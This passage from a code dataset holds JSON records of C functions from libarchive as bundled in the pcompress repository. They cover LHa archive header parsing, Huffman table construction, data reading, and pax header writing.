"language": "c", "size": 9433}
{"docstring": "/*\n * 'LHa for UNIX' utility has archived a symbolic-link name after\n * a pathname with '|' character.\n * This function extracts the symbolic-link name from the pathname.\n *\n * example.\n *   1. a symbolic-name is 'aaa/bb/cc'\n *   2. a filename is 'xxx/bbb'\n *  then a archived pathname is 'xxx/bbb|aaa/bb/cc'\n */\n", "func_signal": "static int\nlha_parse_linkname(struct archive_string *linkname,\n    struct archive_string *pathname)", "code": "{\n\tchar *\tlinkptr;\n\tsize_t \tsymlen;\n\n\tlinkptr = strchr(pathname->s, '|');\n\tif (linkptr != NULL) {\n\t\tsymlen = strlen(linkptr + 1);\n\t\tarchive_strncpy(linkname, linkptr+1, symlen);\n\n\t\t*linkptr = 0;\n\t\tpathname->length = strlen(pathname->s);\n\n\t\treturn (1);\n\t}\n\treturn (0);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Used by extended attribute support; encodes the name\n * so that there will be no '=' characters in the result.\n */\n", "func_signal": "static char *\nurl_encode(const char *in)", "code": "{\n\tconst char *s;\n\tchar *d;\n\tint out_len = 0;\n\tchar *out;\n\n\tfor (s = in; *s != '\\0'; s++) {\n\t\tif (*s < 33 || *s > 126 || *s == '%' || *s == '=')\n\t\t\tout_len += 3;\n\t\telse\n\t\t\tout_len++;\n\t}\n\n\tout = (char *)malloc(out_len + 1);\n\tif (out == NULL)\n\t\treturn (NULL);\n\n\tfor (s = in, d = out; *s != '\\0'; s++) {\n\t\t/* encode any non-printable ASCII character or '%' or '=' */\n\t\tif (*s < 33 || *s > 126 || *s == '%' || *s == '=') {\n\t\t\t/* URL encoding is '%' followed by two hex digits */\n\t\t\t*d++ = '%';\n\t\t\t*d++ = \"0123456789ABCDEF\"[0x0f & (*s >> 4)];\n\t\t\t*d++ = \"0123456789ABCDEF\"[0x0f & *s];\n\t\t} else {\n\t\t\t*d++ = *s;\n\t\t}\n\t}\n\t*d = '\\0';\n\treturn (out);\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * TODO: Store the offset and use it in the read callback.\n */\n", "func_signal": "static int64_t\nfile_seek(struct archive *a, void *client_data, int64_t request, int whence)", "code": "{\n\tstruct read_file_data *mine = (struct read_file_data *)client_data;\n\tint64_t r;\n\n\t/* We use off_t here because lseek() is declared that way. */\n\t/* See above for notes about when off_t is less than 64 bits. */\n\tr = lseek(mine->fd, request, whence);\n\tif (r >= 0)\n\t\treturn r;\n\n\t/* If the input is corrupted or truncated, fail. */\n\tif (mine->filename_type == FNT_STDIN)\n\t\tarchive_set_error(a, errno, \"Error seeking in stdin\");\n\telse if (mine->filename_type == FNT_MBS)\n\t\tarchive_set_error(a, errno, \"Error seeking in '%s'\",\n\t\t    mine->filename.m);\n\telse\n\t\tarchive_set_error(a, errno, \"Error seeking in '%S'\",\n\t\t    mine->filename.w);\n\treturn (ARCHIVE_FATAL);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_open_filename.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Make a huffman coding table.\n */\n", "func_signal": "static int\nlzh_make_huffman_table(struct huffman *hf)", "code": "{\n\tuint16_t *tbl;\n\tconst unsigned char *bitlen;\n\tint bitptn[17], weight[17];\n\tint i, maxbits = 0, ptn, tbl_size, w;\n\tint diffbits, len_avail;\n\n\t/*\n\t * Initialize bit patterns.\n\t */\n\tptn = 0;\n\tfor (i = 1, w = 1 << 15; i <= 16; i++, w >>= 1) {\n\t\tbitptn[i] = ptn;\n\t\tweight[i] = w;\n\t\tif (hf->freq[i]) {\n\t\t\tptn += hf->freq[i] * w;\n\t\t\tmaxbits = i;\n\t\t}\n\t}\n\tif (ptn != 0x10000 || maxbits > hf->tbl_bits)\n\t\treturn (0);/* Invalid */\n\n\thf->max_bits = maxbits;\n\n\t/*\n\t * Cut out extra bits which we won't house in the table.\n\t * This preparation reduces the same calculation in the for-loop\n\t * making the table.\n\t */\n\tif (maxbits < 16) {\n\t\tint ebits = 16 - maxbits;\n\t\tfor (i = 1; i <= maxbits; i++) {\n\t\t\tbitptn[i] >>= ebits;\n\t\t\tweight[i] >>= ebits;\n\t\t}\n\t}\n\tif (maxbits > HTBL_BITS) {\n\t\tint htbl_max;\n\t\tuint16_t *p;\n\n\t\tdiffbits = maxbits - HTBL_BITS;\n\t\tfor (i = 1; i <= HTBL_BITS; i++) {\n\t\t\tbitptn[i] >>= diffbits;\n\t\t\tweight[i] >>= diffbits;\n\t\t}\n\t\thtbl_max = bitptn[HTBL_BITS] +\n\t\t    weight[HTBL_BITS] * hf->freq[HTBL_BITS];\n\t\tp = &(hf->tbl[htbl_max]);\n\t\twhile (p < &hf->tbl[1U<<HTBL_BITS])\n\t\t\t*p++ = 0;\n\t} else\n\t\tdiffbits = 0;\n\thf->shift_bits = diffbits;\n\n\t/*\n\t * Make the table.\n\t */\n\ttbl_size = 1 << HTBL_BITS;\n\ttbl = hf->tbl;\n\tbitlen = hf->bitlen;\n\tlen_avail = hf->len_avail;\n\thf->tree_used = 0;\n\tfor (i = 0; i < len_avail; i++) {\n\t\tuint16_t *p;\n\t\tint len, cnt;\n\t\tuint16_t bit;\n\t\tint extlen;\n\t\tstruct htree_t *ht;\n\n\t\tif (bitlen[i] == 0)\n\t\t\tcontinue;\n\t\t/* Get a bit pattern */\n\t\tlen = bitlen[i];\n\t\tptn = bitptn[len];\n\t\tcnt = weight[len];\n\t\tif (len <= HTBL_BITS) {\n\t\t\t/* Calculate next bit pattern */\n\t\t\tif ((bitptn[len] = ptn + cnt) > tbl_size)\n\t\t\t\treturn (0);/* Invalid */\n\t\t\t/* Update the table */\n\t\t\tp = &(tbl[ptn]);\n\t\t\twhile (--cnt >= 0)\n\t\t\t\tp[cnt] = (uint16_t)i;\n\t\t\tcontinue;\n\t\t}\n\n\t\t/*\n\t\t * A bit length is too big to be housed to a direct table,\n\t\t * so we use a tree model for its extra bits.\n\t\t */\n\t\tbitptn[len] = ptn + cnt;\n\t\tbit = 1U << (diffbits -1);\n\t\textlen = len - HTBL_BITS;\n\t\t\n\t\tp = &(tbl[ptn >> diffbits]);\n\t\tif (*p == 0) {\n\t\t\t*p = len_avail + hf->tree_used;\n\t\t\tht = &(hf->tree[hf->tree_used++]);\n\t\t\tif (hf->tree_used > hf->tree_avail)\n\t\t\t\treturn (0);/* Invalid */\n\t\t\tht->left = 0;\n\t\t\tht->right = 0;\n\t\t} else {\n\t\t\tif (*p < len_avail ||\n\t\t\t    *p >= (len_avail + hf->tree_used))\n\t\t\t\treturn (0);/* Invalid */\n\t\t\tht = &(hf->tree[*p - len_avail]);\n\t\t}\n\t\twhile (--extlen > 0) {\n\t\t\tif (ptn & bit) {\n\t\t\t\tif (ht->left < len_avail) {\n\t\t\t\t\tht->left = len_avail + hf->tree_used;\n\t\t\t\t\tht = &(hf->tree[hf->tree_used++]);\n\t\t\t\t\tif (hf->tree_used > hf->tree_avail)\n\t\t\t\t\t\treturn (0);/* Invalid */\n\t\t\t\t\tht->left = 0;\n\t\t\t\t\tht->right = 0;\n\t\t\t\t} else {\n\t\t\t\t\tht = &(hf->tree[ht->left - len_avail]);\n\t\t\t\t}\n\t\t\t} else {\n\t\t\t\tif (ht->right < len_avail) {\n\t\t\t\t\tht->right = len_avail + hf->tree_used;\n\t\t\t\t\tht = &(hf->tree[hf->tree_used++]);\n\t\t\t\t\tif (hf->tree_used > hf->tree_avail)\n\t\t\t\t\t\treturn (0);/* Invalid */\n\t\t\t\t\tht->left = 0;\n\t\t\t\t\tht->right = 0;\n\t\t\t\t} else {\n\t\t\t\t\tht = &(hf->tree[ht->right - len_avail]);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbit >>= 1;\n\t\t}\n\t\tif (ptn & bit) {\n\t\t\tif (ht->left != 0)\n\t\t\t\treturn (0);/* Invalid */\n\t\t\tht->left = (uint16_t)i;\n\t\t} else {\n\t\t\tif (ht->right != 0)\n\t\t\t\treturn (0);/* Invalid */\n\t\t\tht->right = (uint16_t)i;\n\t\t}\n\t}\n\treturn (1);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Extended header format\n *\n * +0             +2        +3  -- used in header 1 and 2\n * +0             +4        +5  -- used in header 3\n * +--------------+---------+-------------------+--------------+--\n * |ex-header size|header id|        data       |ex-header size| .......\n * +--------------+---------+-------------------+--------------+--\n *  <-------------( ex-header size)------------> <-- next extended header --*\n *\n * If the ex-header size is zero, it is the make of the end of extended\n * headers.\n *\n */\n", "func_signal": "static int\nlha_read_file_extended_header(struct archive_read *a, struct lha *lha,\n    uint16_t *crc, int sizefield_length, size_t limitsize, size_t *total_size)", "code": "{\n\tconst void *h;\n\tconst unsigned char *extdheader;\n\tsize_t\textdsize;\n\tsize_t\tdatasize;\n\tunsigned int i;\n\tunsigned char extdtype;\n\n#define EXT_HEADER_CRC\t\t0x00\t\t/* Header CRC and information*/\n#define EXT_FILENAME\t\t0x01\t\t/* Filename \t\t    */\n#define EXT_DIRECTORY\t\t0x02\t\t/* Directory name\t    */\n#define EXT_DOS_ATTR\t\t0x40\t\t/* MS-DOS attribute\t    */\n#define EXT_TIMESTAMP\t\t0x41\t\t/* Windows time stamp\t    */\n#define EXT_FILESIZE\t\t0x42\t\t/* Large file size\t    */\n#define EXT_TIMEZONE\t\t0x43\t\t/* Time zone\t\t    */\n#define EXT_UTF16_FILENAME\t0x44\t\t/* UTF-16 filename \t    */\n#define EXT_UTF16_DIRECTORY\t0x45\t\t/* UTF-16 directory name    */\n#define EXT_CODEPAGE\t\t0x46\t\t/* Codepage\t\t    */\n#define EXT_UNIX_MODE\t\t0x50\t\t/* File permission\t    */\n#define EXT_UNIX_GID_UID\t0x51\t\t/* gid,uid\t\t    */\n#define EXT_UNIX_GNAME\t\t0x52\t\t/* Group name\t\t    */\n#define EXT_UNIX_UNAME\t\t0x53\t\t/* User name\t\t    */\n#define EXT_UNIX_MTIME\t\t0x54\t\t/* Modified time\t    */\n#define EXT_OS2_NEW_ATTR\t0x7f\t\t/* new attribute(OS/2 only) */\n#define EXT_NEW_ATTR\t\t0xff\t\t/* new attribute\t    */\n\n\t*total_size = sizefield_length;\n\n\tfor (;;) {\n\t\t/* Read an extended header size. */\n\t\tif ((h =\n\t\t    __archive_read_ahead(a, sizefield_length, NULL)) == NULL)\n\t\t\treturn (truncated_error(a));\n\t\t/* Check if the size is the zero indicates the end of the\n\t\t * extended header. */\n\t\tif (sizefield_length == sizeof(uint16_t))\n\t\t\textdsize = archive_le16dec(h);\n\t\telse\n\t\t\textdsize = archive_le32dec(h);\n\t\tif (extdsize == 0) {\n\t\t\t/* End of extended header */\n\t\t\tif (crc != NULL)\n\t\t\t\t*crc = lha_crc16(*crc, h, sizefield_length);\n\t\t\t__archive_read_consume(a, sizefield_length);\n\t\t\treturn (ARCHIVE_OK);\n\t\t}\n\n\t\t/* Sanity check to the extended header size. */\n\t\tif (((uint64_t)*total_size + extdsize) >\n\t\t\t\t    (uint64_t)limitsize ||\n\t\t    extdsize <= (size_t)sizefield_length)\n\t\t\tgoto invalid;\n\n\t\t/* Read the extended header. */\n\t\tif ((h = __archive_read_ahead(a, extdsize, NULL)) == NULL)\n\t\t\treturn (truncated_error(a));\n\t\t*total_size += extdsize;\n\n\t\textdheader = (const unsigned char *)h;\n\t\t/* Get the extended header type. */\n\t\textdtype = extdheader[sizefield_length];\n\t\t/* Calculate an extended data size. */\n\t\tdatasize = extdsize - (1 + sizefield_length);\n\t\t/* Skip an extended header size field and type field. */\n\t\textdheader += sizefield_length + 1;\n\n\t\tif (crc != NULL && extdtype != EXT_HEADER_CRC)\n\t\t\t*crc = lha_crc16(*crc, h, extdsize);\n\t\tswitch (extdtype) {\n\t\tcase EXT_HEADER_CRC:\n\t\t\t/* We only use a header CRC. Following data will not\n\t\t\t * be used. */\n\t\t\tif (datasize >= 2) {\n\t\t\t\tlha->header_crc = archive_le16dec(extdheader);\n\t\t\t\tif (crc != NULL) {\n\t\t\t\t\tstatic const char zeros[2] = {0, 0};\n\t\t\t\t\t*crc = lha_crc16(*crc, h,\n\t\t\t\t\t    extdsize - datasize);\n\t\t\t\t\t/* CRC value itself as zero */\n\t\t\t\t\t*crc = lha_crc16(*crc, zeros, 2);\n\t\t\t\t\t*crc = lha_crc16(*crc,\n\t\t\t\t\t    extdheader+2, datasize - 2);\n\t\t\t\t}\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_FILENAME:\n\t\t\tif (datasize == 0) {\n\t\t\t\t/* maybe directory header */\n\t\t\t\tarchive_string_empty(&lha->filename);\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tarchive_strncpy(&lha->filename,\n\t\t\t    (const char *)extdheader, datasize);\n\t\t\tbreak;\n\t\tcase EXT_DIRECTORY:\n\t\t\tif (datasize == 0)\n\t\t\t\t/* no directory name data. exit this case. */\n\t\t\t\tbreak;\n\n\t\t\tarchive_strncpy(&lha->dirname,\n\t\t  \t    (const char *)extdheader, datasize);\n\t\t\t/*\n\t\t\t * Convert directory delimiter from 0xFF\n\t\t\t * to '/' for local system.\n\t \t\t */\n\t\t\tfor (i = 0; i < lha->dirname.length; i++) {\n\t\t\t\tif ((unsigned char)lha->dirname.s[i] == 0xFF)\n\t\t\t\t\tlha->dirname.s[i] = '/';\n\t\t\t}\n\t\t\t/* Is last character directory separator? */\n\t\t\tif (lha->dirname.s[lha->dirname.length-1] != '/')\n\t\t\t\t/* invalid directory data */\n\t\t\t\tgoto invalid;\n\t\t\tbreak;\n\t\tcase EXT_DOS_ATTR:\n\t\t\tif (datasize == 2)\n\t\t\t\tlha->dos_attr = (unsigned char)\n\t\t\t\t    (archive_le16dec(extdheader) & 0xff);\n\t\t\tbreak;\n\t\tcase EXT_TIMESTAMP:\n\t\t\tif (datasize == (sizeof(uint64_t) * 3)) {\n\t\t\t\tlha->birthtime = lha_win_time(\n\t\t\t\t    archive_le64dec(extdheader),\n\t\t\t\t    &lha->birthtime_tv_nsec);\n\t\t\t\textdheader += sizeof(uint64_t);\n\t\t\t\tlha->mtime = lha_win_time(\n\t\t\t\t    archive_le64dec(extdheader),\n\t\t\t\t    &lha->mtime_tv_nsec);\n\t\t\t\textdheader += sizeof(uint64_t);\n\t\t\t\tlha->atime = lha_win_time(\n\t\t\t\t    archive_le64dec(extdheader),\n\t\t\t\t    &lha->atime_tv_nsec);\n\t\t\t\tlha->setflag |= BIRTHTIME_IS_SET |\n\t\t\t\t    ATIME_IS_SET;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_FILESIZE:\n\t\t\tif (datasize == sizeof(uint64_t) * 2) {\n\t\t\t\tlha->compsize = archive_le64dec(extdheader);\n\t\t\t\textdheader += sizeof(uint64_t);\n\t\t\t\tlha->origsize = archive_le64dec(extdheader);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_CODEPAGE:\n\t\t\t/* Get an archived filename charset from codepage.\n\t\t\t * This overwrites the charset specified by\n\t\t\t * hdrcharset option. */\n\t\t\tif (datasize == sizeof(uint32_t)) {\n\t\t\t\tstruct archive_string cp;\n\t\t\t\tconst char *charset;\n\n\t\t\t\tarchive_string_init(&cp);\n\t\t\t\tswitch (archive_le32dec(extdheader)) {\n\t\t\t\tcase 65001: /* UTF-8 */\n\t\t\t\t\tcharset = \"UTF-8\";\n\t\t\t\t\tbreak;\n\t\t\t\tdefault:\n\t\t\t\t\tarchive_string_sprintf(&cp, \"CP%d\",\n\t\t\t\t\t    (int)archive_le32dec(extdheader));\n\t\t\t\t\tcharset = cp.s;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tlha->sconv =\n\t\t\t\t    archive_string_conversion_from_charset(\n\t\t\t\t\t&(a->archive), charset, 1);\n\t\t\t\tarchive_string_free(&cp);\n\t\t\t\tif (lha->sconv == NULL)\n\t\t\t\t\treturn (ARCHIVE_FATAL);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_UNIX_MODE:\n\t\t\tif (datasize == sizeof(uint16_t)) {\n\t\t\t\tlha->mode = archive_le16dec(extdheader);\n\t\t\t\tlha->setflag |= UNIX_MODE_IS_SET;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_UNIX_GID_UID:\n\t\t\tif (datasize == (sizeof(uint16_t) * 2)) {\n\t\t\t\tlha->gid = archive_le16dec(extdheader);\n\t\t\t\tlha->uid = archive_le16dec(extdheader+2);\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_UNIX_GNAME:\n\t\t\tif (datasize > 0)\n\t\t\t\tarchive_strncpy(&lha->gname,\n\t\t\t\t    (const char *)extdheader, datasize);\n\t\t\tbreak;\n\t\tcase EXT_UNIX_UNAME:\n\t\t\tif (datasize > 0)\n\t\t\t\tarchive_strncpy(&lha->uname,\n\t\t\t\t    (const char *)extdheader, datasize);\n\t\t\tbreak;\n\t\tcase EXT_UNIX_MTIME:\n\t\t\tif (datasize == sizeof(uint32_t))\n\t\t\t\tlha->mtime = archive_le32dec(extdheader);\n\t\t\tbreak;\n\t\tcase EXT_OS2_NEW_ATTR:\n\t\t\t/* This extended header is OS/2 depend. */\n\t\t\tif (datasize == 16) {\n\t\t\t\tlha->dos_attr = (unsigned char)\n\t\t\t\t    (archive_le16dec(extdheader) & 0xff);\n\t\t\t\tlha->mode = archive_le16dec(extdheader+2);\n\t\t\t\tlha->gid = archive_le16dec(extdheader+4);\n\t\t\t\tlha->uid = archive_le16dec(extdheader+6);\n\t\t\t\tlha->birthtime = archive_le32dec(extdheader+8);\n\t\t\t\tlha->atime = archive_le32dec(extdheader+12);\n\t\t\t\tlha->setflag |= UNIX_MODE_IS_SET\n\t\t\t\t    | BIRTHTIME_IS_SET | ATIME_IS_SET;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_NEW_ATTR:\n\t\t\tif (datasize == 20) {\n\t\t\t\tlha->mode = (mode_t)archive_le32dec(extdheader);\n\t\t\t\tlha->gid = archive_le32dec(extdheader+4);\n\t\t\t\tlha->uid = archive_le32dec(extdheader+8);\n\t\t\t\tlha->birthtime = archive_le32dec(extdheader+12);\n\t\t\t\tlha->atime = archive_le32dec(extdheader+16);\n\t\t\t\tlha->setflag |= UNIX_MODE_IS_SET\n\t\t\t\t    | BIRTHTIME_IS_SET | ATIME_IS_SET;\n\t\t\t}\n\t\t\tbreak;\n\t\tcase EXT_TIMEZONE:\t\t/* Not supported */\n\t\tcase EXT_UTF16_FILENAME:\t/* Not supported */\n\t\tcase EXT_UTF16_DIRECTORY:\t/* Not supported */\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\n\t\t__archive_read_consume(a, extdsize);\n\t}\ninvalid:\n\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT,\n\t    \"Invalid extended LHa header\");\n\treturn (ARCHIVE_FATAL);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Read a file content in no compression.\n *\n * Returns ARCHIVE_OK if successful, ARCHIVE_FATAL otherwise, sets\n * lha->end_of_entry if it consumes all of the data.\n */\n", "func_signal": "static int\nlha_read_data_none(struct archive_read *a, const void **buff,\n    size_t *size, int64_t *offset)", "code": "{\n\tstruct lha *lha = (struct lha *)(a->format->data);\n\tssize_t bytes_avail;\n\n\tif (lha->entry_bytes_remaining == 0) {\n\t\t*buff = NULL;\n\t\t*size = 0;\n\t\t*offset = lha->entry_offset;\n\t\tlha->end_of_entry = 1;\n\t\treturn (ARCHIVE_OK);\n\t}\n\t/*\n\t * Note: '1' here is a performance optimization.\n\t * Recall that the decompression layer returns a count of\n\t * available bytes; asking for more than that forces the\n\t * decompressor to combine reads by copying data.\n\t */\n\t*buff = __archive_read_ahead(a, 1, &bytes_avail);\n\tif (bytes_avail <= 0) {\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t    \"Truncated LHa file data\");\n\t\treturn (ARCHIVE_FATAL);\n\t}\n\tif (bytes_avail > lha->entry_bytes_remaining)\n\t\tbytes_avail = (ssize_t)lha->entry_bytes_remaining;\n\tlha->entry_crc_calculated =\n\t    lha_crc16(lha->entry_crc_calculated, *buff, bytes_avail);\n\t*size = bytes_avail;\n\t*offset = lha->entry_offset;\n\tlha->entry_offset += bytes_avail;\n\tlha->entry_bytes_remaining -= bytes_avail;\n\tif (lha->entry_bytes_remaining == 0)\n\t\tlha->end_of_entry = 1;\n\tlha->entry_unconsumed = bytes_avail;\n\treturn (ARCHIVE_OK);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Read a file content in LZHUFF encoding.\n *\n * Returns ARCHIVE_OK if successful, returns ARCHIVE_WARN if compression is\n * unsupported, ARCHIVE_FATAL otherwise, sets lha->end_of_entry if it consumes\n * all of the data.\n */\n", "func_signal": "static int\nlha_read_data_lzh(struct archive_read *a, const void **buff,\n    size_t *size, int64_t *offset)", "code": "{\n\tstruct lha *lha = (struct lha *)(a->format->data);\n\tssize_t bytes_avail;\n\tint r;\n\n\t/* If the buffer hasn't been allocated, allocate it now. */\n\tif (lha->uncompressed_buffer == NULL) {\n\t\tlha->uncompressed_buffer_size = 64 * 1024;\n\t\tlha->uncompressed_buffer\n\t\t    = (unsigned char *)malloc(lha->uncompressed_buffer_size);\n\t\tif (lha->uncompressed_buffer == NULL) {\n\t\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t\t    \"No memory for lzh decompression\");\n\t\t\treturn (ARCHIVE_FATAL);\n\t\t}\n\t}\n\n\t/* If we haven't yet read any data, initialize the decompressor. */\n\tif (!lha->decompress_init) {\n\t\tr = lzh_decode_init(&(lha->strm), lha->method);\n\t\tswitch (r) {\n\t\tcase ARCHIVE_OK:\n\t\t\tbreak;\n\t\tcase ARCHIVE_FAILED:\n        \t\t/* Unsupported compression. */\n\t\t\t*buff = NULL;\n\t\t\t*size = 0;\n\t\t\t*offset = 0;\n\t\t\tarchive_set_error(&a->archive,\n\t\t\t    ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t\t    \"Unsupported lzh compression method -%c%c%c-\",\n\t\t\t    lha->method[0], lha->method[1], lha->method[2]);\n\t\t\t/* We know compressed size; just skip it. */\n\t\t\tarchive_read_format_lha_read_data_skip(a);\n\t\t\treturn (ARCHIVE_WARN);\n\t\tdefault:\n\t\t\tarchive_set_error(&a->archive, ENOMEM,\n\t\t\t    \"Couldn't allocate memory \"\n\t\t\t    \"for lzh decompression\");\n\t\t\treturn (ARCHIVE_FATAL);\n\t\t}\n\t\t/* We've initialized decompression for this stream. */\n\t\tlha->decompress_init = 1;\n\t\tlha->strm.avail_out = 0;\n\t\tlha->strm.total_out = 0;\n\t}\n\n\t/*\n\t * Note: '1' here is a performance optimization.\n\t * Recall that the decompression layer returns a count of\n\t * available bytes; asking for more than that forces the\n\t * decompressor to combine reads by copying data.\n\t */\n\tlha->strm.next_in = __archive_read_ahead(a, 1, &bytes_avail);\n\tif (bytes_avail <= 0) {\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_FILE_FORMAT,\n\t\t    \"Truncated LHa file body\");\n\t\treturn (ARCHIVE_FATAL);\n\t}\n\tif (bytes_avail > lha->entry_bytes_remaining)\n\t\tbytes_avail = (ssize_t)lha->entry_bytes_remaining;\n\n\tlha->strm.avail_in = bytes_avail;\n\tlha->strm.total_in = 0;\n\tif (lha->strm.avail_out == 0) {\n\t\tlha->strm.next_out = lha->uncompressed_buffer;\n\t\tlha->strm.avail_out = lha->uncompressed_buffer_size;\n\t}\n\n\tr = lzh_decode(&(lha->strm), bytes_avail == lha->entry_bytes_remaining);\n\tswitch (r) {\n\tcase ARCHIVE_OK:\n\t\tbreak;\n\tcase ARCHIVE_EOF:\n\t\tlha->end_of_entry = 1;\n\t\tbreak;\n\tdefault:\n\t\tarchive_set_error(&a->archive, ARCHIVE_ERRNO_MISC,\n\t\t    \"Bad lzh data\");\n\t\treturn (ARCHIVE_FAILED);\n\t}\n\tlha->entry_unconsumed = lha->strm.total_in;\n\tlha->entry_bytes_remaining -= lha->strm.total_in;\n\n\tif (lha->strm.avail_out == 0 || lha->end_of_entry) {\n\t\t*offset = lha->entry_offset;\n\t\t*size = lha->strm.next_out - lha->uncompressed_buffer;\n\t\t*buff = lha->uncompressed_buffer;\n\t\tlha->entry_crc_calculated =\n\t\t    lha_crc16(lha->entry_crc_calculated, *buff, *size);\n\t\tlha->entry_offset += *size;\n\t} else {\n\t\t*offset = lha->entry_offset;\n\t\t*size = 0;\n\t\t*buff = NULL;\n\t}\n\treturn (ARCHIVE_OK);\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Replace a DOS path separator '\\' by a character '/'.\n * Some multi-byte character set have  a character '\\' in its second byte.\n */\n", "func_signal": "static void\nlha_replace_path_separator(struct lha *lha, struct archive_entry *entry)", "code": "{\n\tconst wchar_t *wp;\n\tsize_t i;\n\n\tif ((wp = archive_entry_pathname_w(entry)) != NULL) {\n\t\tarchive_wstrcpy(&(lha->ws), wp);\n\t\tfor (i = 0; i < archive_strlen(&(lha->ws)); i++) {\n\t\t\tif (lha->ws.s[i] == L'\\\\')\n\t\t\t\tlha->ws.s[i] = L'/';\n\t\t}\n\t\tarchive_entry_copy_pathname_w(entry, lha->ws.s);\n\t}\n\n\tif ((wp = archive_entry_symlink_w(entry)) != NULL) {\n\t\tarchive_wstrcpy(&(lha->ws), wp);\n\t\tfor (i = 0; i < archive_strlen(&(lha->ws)); i++) {\n\t\t\tif (lha->ws.s[i] == L'\\\\')\n\t\t\t\tlha->ws.s[i] = L'/';\n\t\t}\n\t\tarchive_entry_copy_symlink_w(entry, lha->ws.s);\n\t}\n}", "path": "archive\\libarchive\\libarchive\\archive_read_support_format_lha.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Set output format to 'restricted pax' format.\n *\n * This is the same as normal 'pax', but tries to suppress\n * the pax header whenever possible.  This is the default for\n * bsdtar, for instance.\n */\n", "func_signal": "int\narchive_write_set_format_pax_restricted(struct archive *_a)", "code": "{\n\tstruct archive_write *a = (struct archive_write *)_a;\n\tint r;\n\n\tarchive_check_magic(_a, ARCHIVE_WRITE_MAGIC,\n\t    ARCHIVE_STATE_NEW, \"archive_write_set_format_pax_restricted\");\n\n\tr = archive_write_set_format_pax(&a->archive);\n\ta->archive.archive_format = ARCHIVE_FORMAT_TAR_PAX_RESTRICTED;\n\ta->archive.archive_format_name = \"restricted POSIX pax interchange\";\n\treturn (r);\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
{"docstring": "/*\n * Add a key/value attribute to the pax header.  This function handles\n * the length field and various other syntactic requirements.\n */\n", "func_signal": "static void\nadd_pax_attr(struct archive_string *as, const char *key, const char *value)", "code": "{\n\tint digits, i, len, next_ten;\n\tchar tmp[1 + 3 * sizeof(int)];\t/* < 3 base-10 digits per byte */\n\n\t/*-\n\t * PAX attributes have the following layout:\n\t *     <len> <space> <key> <=> <value> <nl>\n\t */\n\tlen = 1 + (int)strlen(key) + 1 + (int)strlen(value) + 1;\n\n\t/*\n\t * The <len> field includes the length of the <len> field, so\n\t * computing the correct length is tricky.  I start by\n\t * counting the number of base-10 digits in 'len' and\n\t * computing the next higher power of 10.\n\t */\n\tnext_ten = 1;\n\tdigits = 0;\n\ti = len;\n\twhile (i > 0) {\n\t\ti = i / 10;\n\t\tdigits++;\n\t\tnext_ten = next_ten * 10;\n\t}\n\t/*\n\t * For example, if string without the length field is 99\n\t * chars, then adding the 2 digit length \"99\" will force the\n\t * total length past 100, requiring an extra digit.  The next\n\t * statement adjusts for this effect.\n\t */\n\tif (len + digits >= next_ten)\n\t\tdigits++;\n\n\t/* Now, we have the right length so we can build the line. */\n\ttmp[sizeof(tmp) - 1] = 0;\t/* Null-terminate the work area. */\n\tarchive_strcat(as, format_int(tmp + sizeof(tmp) - 1, len + digits));\n\tarchive_strappend_char(as, ' ');\n\tarchive_strcat(as, key);\n\tarchive_strappend_char(as, '=');\n\tarchive_strcat(as, value);\n\tarchive_strappend_char(as, '\\n');\n}", "path": "archive\\libarchive\\libarchive\\archive_write_set_format_pax.c", "repo_name": "moinakg/pcompress", "stars": 268, "license": "lgpl-3.0", "language": "c", "size": 9433}
